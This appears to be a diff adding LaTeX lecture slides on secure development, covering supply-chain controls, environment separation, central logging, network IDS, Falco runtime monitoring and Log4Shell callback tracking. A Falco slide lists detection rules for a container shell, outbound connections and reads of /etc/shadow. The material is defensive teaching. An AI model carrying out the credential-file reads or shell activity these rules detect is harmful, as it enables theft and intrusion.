+Juice Shop has \verb+package-lock=false+ -- every install resolves again
+\item Waiting before taking new versions -- the malicious versions lived for hours
+\item \verb+--ignore-scripts+ -- would \emph{not} have helped here:\\
+the chalk/debug payload ran in the browser, not at install time\\
+It does help against install-time malware like Shai-Hulud a week later
+\item osv-scanner and \verb+MAL-+ advisories -- find it afterwards, if the exact version is in your lockfile
+\vskip 1em
+\item No single control is enough -- defense in depth, also in the supply chain
+\end{list2}
+
+% ======================================================================
+% Session 5
+% ======================================================================
+
+\slide{Session 5: Runtime environments -- final recommendations}
+\begin{list2}
+\item ISO/IEC 27001:2022 Annex A 8.31 -- separation of development, test and production
+\item Kubernetes examples
+\item Don't forget the usual stuff:
+\begin{list2}
+\item Centralized logging -- VictoriaLogs as example
+\item Network IDS -- Suricata and Zeek
+\item Runtime monitoring for containers -- Falco
+\end{list2}
+\item Log4Shell callbacks -- why outbound traffic matters
+\item Final recommendations
+\end{list2}
+
+
+\slide{Separation of Development, Test and Production Environments}
+
+\begin{quote}
+Control 8.31:\\
+Separation of development, test and production environments\\
+Development, testing and production environments are separated and secured. (paraphrased)
+\end{quote}
+
+\begin{list1}
+\item Can a developer deploy directly to production -- without the pipeline?
+\item Is production data used in test -- and is test protected like production then?
+\item Do test and production share credentials, networks or clusters?
+\item Are compilers, debuggers and admin tools present in production?
+\end{list1}
+
+Source: ISO/IEC 27001:2022 Annex A 8.31
+
+
+\slide{Separation with Kubernetes -- examples}
+
+\begin{list2}
+\item Separate clusters for production -- namespaces are not a strong boundary
+\item Separate cloud accounts or projects -- different credentials, different blast radius
+\item RBAC: developers read in production, the pipeline deploys
+\item Network policies and firewalls between environments
+\item Same images in test and production -- promote by digest, do not rebuild
+\item Admission policies stricter in production -- example Kyverno
+\item Test data generated or anonymised -- see Privacy by Design
+\end{list2}
+
+
+\slide{Soft Multi tenancy}
+
+Depending on your needs, it might be interesting to investigate soft multi tenancy;
+
+\begin{quote}
+The level of isolation offered is sometimes described using terms like “hard” multi-tenancy, which implies strong isolation, and “soft” multi-tenancy, which implies weaker isolation. In particular, "hard" multi-tenancy is often used to describe cases where the tenants do not trust each other, often from security and resource sharing perspectives (e.g. guarding against attacks such as data exfiltration or DoS). Since data planes typically have much larger attack surfaces, "hard" multi-tenancy often requires extra attention to isolating the data-plane, though control plane isolation also remains critical.
+\end{quote}
+Source: \link{https://kubernetes.io/docs/concepts/security/multi-tenancy/}
+
+\begin{list2}
+\item Namespaces give soft multi tenancy -- prevent accidents, breaking other groups services
+\item Production and test do not trust each other in the same way -- prefer separate clusters/tenants
+\end{list2}
+
+\slide{Preparing environments for production}
+
+\begin{list2}
+\item 6-SDL-practices: change management, the foundation must be in order
+\item Production checklist -- examples:
+\begin{list2}
+\item Debug off, sample data and default accounts removed
+\item Secrets from a secret store, not from files in the image
+\item Logs sent off the system
+\item Backups tested -- restore, not just backup
+\item Monitoring and alerting -- someone actually receives the alerts
+\end{list2}
+\item Automate the checklist -- policies, benchmarks like kube-bench and Lynis
+\end{list2}
+
+
+\slide{Maintenance, Monitoring and Analysis of Audit Logs}
+
+\begin{quote}
+CIS Control 6:\\
+Maintenance, Monitoring and Analysis of Audit Logs\\
+Collect, manage, and analyze audit logs of events that could help detect, understand, or recover from an attack.
+\end{quote}
+
+\begin{list1}
+\item ... and present it, use it daily, report it to management!
+\item Send logs off the system -- an attacker with root can delete local logs
+\item Log security events -- logins, failed logins, permission changes, admin actions
+\item Do not log secrets and personal data -- tokens in URLs end up in logs
+\item OWASP Top 10:2025 A09 -- Security Logging and Alerting Failures
+\end{list1}
+
+Source: Center for Internet Security CIS Controls 7.1 CIS-Controls-Version-7-1.pdf
+
+
+\slide{VictoriaLogs}
+
+\hlkimage{10cm}{victorialogs-overview.png}
+
+VictoriaLogs is an open source log database from VictoriaMetrics, used as the central store that many systems send their logs into, which enables cross-application searching and correlation.
+
+Picture from https://docs.victoriametrics.com/victorialogs/
+
+
+\slide{VictoriaLogs overview}
+
+\begin{minted}{bash}
+curl -s http://localhost:9428/select/logsql/query \
+  -d 'query=_time:5m log.level:error' | jq -r '._msg'
+\end{minted}
+
+\begin{list2}
+\item Single executable, zero configuration, sensible defaults --
+  single-node and cluster versions, Apache License 2.0
+\item Ingestion -- accepts logs over many common protocols, e.g.
+  JSON lines over HTTP, syslog,
+  HTTP API JSON and existing shippers like Vector, Fluent Bit, Filebeat work
+\item LogsQL -- query language with full-text search and analytics, e.g.
+\item Web UI built in, plus a Grafana plugin for dashboards
+\item Works with command line tools too -- \verb+curl+, \verb+jq+, \verb+grep+, \verb+sort+
+\end{list2}
+
+Documentation:\\
+\url{https://docs.victoriametrics.com/victorialogs/}
+
+
+\slide{Network IDS -- Suricata and Zeek}
+
+\begin{list2}
+\item Applications and hosts can be compromised -- the network sees the traffic anyway
+\item Suricata -- IDS/IPS with signatures, protocol parsing, file extraction,
+JSON event output (EVE) \link{https://suricata.io/}
+\item Zeek -- network security monitor, writes detailed logs of connections,
+DNS, HTTP, TLS, ... \link{https://zeek.org/}
+\item Both write JSON logs -- send them to the same central log store as everything else
+\item Especially useful: DNS logs, TLS server names, new outbound connections
+\item Remember Suricata has CVEs too -- keep the sensors updated
+\end{list2}
+
+
+\slide{Intrusion Detection on Kubernetes}
+
+\begin{quote}
+{\bf Chapter 9. Intrusion Detection}\\
+In this chapter we will see how container intrusion detection operates with the new low-level eBPF interface, what forensics looks like for a container, and how to catch attackers who have evaded all other controls.
+\end{quote}
+Source: \emph{Hacking Kubernetes: Threat-Driven Analysis and Defense}, Andrew Martin, Michael Hausenblas, O'Reilly, October 2021
+
+\begin{list2}
+\item Tool they present is Falco an eBPF-Based IDS
+\item They also mention my favourites Zeek \link{https://zeek.org/} and Suricata \link{https://suricata.io/}
+\item Cilium has Hubble for network flow observability -- who talks to whom\\
+\link{https://docs.cilium.io/en/stable/observability/hubble/}
+\item I recommend doing your usual, and then evaluate options
+\end{list2}
+
+
+\slide{Runtime monitoring for containers -- Falco}
+
+\begin{list1}
+\item Falco -- runtime security for hosts, containers and Kubernetes, CNCF graduated\\
+ \link{https://falco.org/}
+\item Uses the modern eBPF probe -- watches system calls and Kubernetes audit events, alerts on rules like:
+\begin{list2}
+\item A shell started inside a container
+\item Write below \verb+/etc+ or to binary directories
+\item Unexpected outbound connection
+\item Read of sensitive files like \verb+/etc/shadow+
+\end{list2}
+\item Alternatives in the same space: Tetragon (Cilium project), Tracee (Aqua)
+\item Originally created by Sysdig and they have published analyses of runc escapes and Shai-Hulud
+\end{list1}
+
+
+\slide{Log4Shell callbacks}
+
+\begin{list2}
+\item Log4Shell exploitation required an outbound connection -- LDAP, DNS -- to a callback server
+\item 12 December 2021, two days after disclosure: CrowdSec published a GitHub Gist with\\
+IPs exploiting CVE-2021-44228, detected by the CrowdSec community -- and a live tracker\\
+{\footnotesize\link{https://gist.github.com/blotus/f87ed46718bfdc634c9081110d243166}}
+\item Others followed, e.g. GreyNoise lists of scanning IPs and callback domains,\\
+Fox-IT lists of observed listeners
+\item Organisations with DNS logs and Zeek/Suricata logs could search back in time:\\
+did any of our servers connect to these?
+\item Organisations with default deny egress were not reachable by the second stage
+\vskip 1em
+\item Logging you set up before the incident is the logging you can use during it
+\end{list2}
+
+\slide{Monitoring and updating -- upgrades}
+
+\begin{quote}
+Since Kubernetes is a complex system, I recommend making an initial deployment plan which is longer than a release cycle of Kubernetes. Currently new releases are coming out rapidly, so a 3-4 month plan should suffice.
+
+{\bf Main goal is to try upgrading the cluster \emph{before} you have production running!}
+\end{quote}
+
+\link{https://kubernetes.io/releases/}
+
+You need to upgrade all parts, so remember which parts you use:
+\begin{list2}
+\item Firmwares and supporting systems, routers, switches, server control, storage, ...
+\item Operating systems
+\item Kubernetes core components
+\item CNI like Cilium, policy engines like Kyverno, and various other plugins
+\item Your own images -- rebuild for new base images
+\end{list2}
+
+
+\slide{Final recommendations}
+
+\begin{list2}
+\item Know what you run -- inventory, SBOM, lockfiles committed
+\item Use the framework's security functions -- authentication, CSRF, escaping, ORM
+\item Phishing-resistant MFA for everyone who can publish code or deploy
+\item Least privilege everywhere -- users, service accounts, tokens, pipelines, containers
+\item Pin what you depend on -- actions, images, packages -- and update deliberately
+\item Enforce rules at the gates -- Git hooks, CI, admission control
+\item Separate development, test and production
+\item Log centrally, monitor network and runtime -- don't forget the usual stuff like IDS
+\item Practice -- the Juice Shop is always available for training
+\end{list2}
+
+
+\slide{Annex A Controls and today}
+
+\begin{list2}
+\item 5.15 Access control, 8.5 Secure authentication -- Session 0
+\item 5.34 Privacy and protection of PII -- Session 0
+\item 8.27 Secure system architecture and engineering principles -- Session 1
+\item 8.9 Configuration management -- Session 2 and 3
+\item 8.25 Secure development life cycle, 8.29 Security testing -- Session 3
+\item 5.21 Managing information security in the ICT supply chain -- Session 4
+\item 8.8 Management of technical vulnerabilities -- Session 4
+\item 8.31 Separation of development, test and production environments -- Session 5
+\item 8.15 Logging, 8.16 Monitoring activities -- Session 5
+\end{list2}
+% TODO: verify control numbers against your copy of ISO/IEC 27001:2022
+
+
+\myquestionspage
+
+
+\slide{Optional: Exercises, questions}
+
+\begin{list2}
+\item Continue the exercises from today -- or pick from the booklet
+\item Questions and loose talk -- what will you take back to your team?
+\item Your own environment: which of the final recommendations is the first to work on?
+\item Exercise booklet has more material for later:
+\begin{list2}
+\item Session tokens, Postman, password hashing
+\item Django string handling, ORM and e-mail validation
+\item Git hook, PMD static analysis, American fuzzy lop
+\item Real vulnerabilities, security.txt, securing the Juice Shop, Lynis
+\end{list2}
+\end{list2}
+
+\end{document}
+
+\demo{ex:github-perms}
+\demo{ex:research-middleware-csrf}
+\demo{ex:kyverno-playground}
+\demo{ex:pipeline-threat-model}
+\demo{ex:npm-audit-osv}
+
+\demo{ex:identify-tokens}
+\demo{ex:postman-api}
+\demo{ex:php-passwords}
+\demo{ex:django-string}
+\demo{ex:django-orm}
+\demo{ex:django-email}
+\demo{ex:git-hook}
+\demo{ex:pmd-static}
+\demo{ex:american-fuzzy-lop}
+\demo{ex:real-vulns}
+\demo{ex:security.txt}
+\demo{ex:secure-juiceshop}
+\demo{ex:lynis-first}
+
+\end{document}
